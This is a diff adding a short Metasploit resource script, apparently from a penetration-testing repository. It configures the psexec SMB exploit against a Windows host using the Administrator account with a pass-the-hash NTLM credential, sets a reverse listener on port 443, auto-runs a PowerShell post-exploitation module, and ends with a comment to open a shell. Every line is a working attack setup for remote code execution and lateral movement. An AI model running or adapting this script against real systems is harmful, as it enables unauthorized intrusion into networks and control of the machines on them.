@@ -1,0 +1,11 @@
+#run msfconsole -r thiscript
+# we really don't need to do this via a .rc file, but we may want to add to it later on
+set AutoRunScript post/windows/manage/exec_powershell
+use exploit/windows/smb/psexec
+set LHOST 10.0.10.212
+set LPORT 443
+set RHOST 10.0.10.211
+set SMBUser Administrator
+set SMBPass 00000000000000000000000000000000:b2568aaa902caf959388cfdfee966c10
+exploit
+# then run shell
